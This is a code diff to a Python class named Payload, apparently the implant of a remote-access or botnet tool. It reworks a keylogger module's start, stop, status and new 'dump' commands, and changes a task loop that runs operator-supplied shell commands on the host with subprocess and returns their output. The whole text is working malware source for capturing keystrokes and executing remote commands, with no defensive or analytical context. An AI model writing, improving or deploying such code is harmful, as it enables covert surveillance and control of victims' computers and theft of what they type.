@@ -832,17 +832,16 @@ class Payload():
         """
         def status():
             try:
-                mode    = 'stopped'
-                if 'keylogger' in self.handlers:
-                    mode= 'running'
-                update  = status(float(self.handlers.get('keylogger').name))
-                length  = globals()['keylogger']._buffer.tell()
+                mode = 'running' if 'keylogger' in self.handlers else 'stopped'
+                update  = globals()['keylogger'].threads['keylogger'].name
+                length  = globals()['keylogger'].logs.tell()
                 return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(__name__, mode, update, length)
             except Exception as e:
+                print(str(e))
                 log("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
             self.load('keylogger')
-        elif not mode:
+        if not mode:
             if 'keylogger' not in self.handlers:
                 return globals()['keylogger'].usage
             else:
@@ -850,8 +849,12 @@ class Payload():
         else:
             if 'run' in mode or 'start' in mode:
                 if 'keylogger' not in self.handlers:
-                    self.handlers['keylogger'] = globals()['keylogger'].run()
-                    return locals()['status']()
+                    try:
+                        self.handlers['keylogger'] = globals()['keylogger'].run()
+                        return locals()['status']()
+                    except Exception as e:
+                        print(str(e))
+                        log("{} error: {}".format('keylogger.status', str(e)))
                 else:
                     return locals()['status']()
             elif 'stop' in mode:
@@ -870,7 +873,9 @@ class Payload():
                 globals()['keylogger']._buffer.reset()
                 return result
             elif 'status' in mode:
-                return locals()['status']()        
+                return locals()['status']()
+            elif 'dump' in mode:
+                return globals()['keylogger'].dump()
             else:
                 return keylogger.usage + '\n\targs: start, stop, dump'
 
@@ -1023,8 +1028,9 @@ class Payload():
                         cmd, _, action = task['task'].partition(' ')
                         try:
                             command = self._get_command(cmd)
-                            result = (command(action) if action else bytes(str(command()), 'utf-8')) if command else bytes('',encoding='utf-8').join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                            print(result)
+                            result = command(action) if action else command() if command else bytes('',encoding='utf-8').join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            if isinstance(result, str):
+                                result = bytes(result,encoding='utf-8')
                         except Exception as e:
                             result = "{} error: {}".format(self.run.__name__, str(e))
                             log(level='debug', info=result)
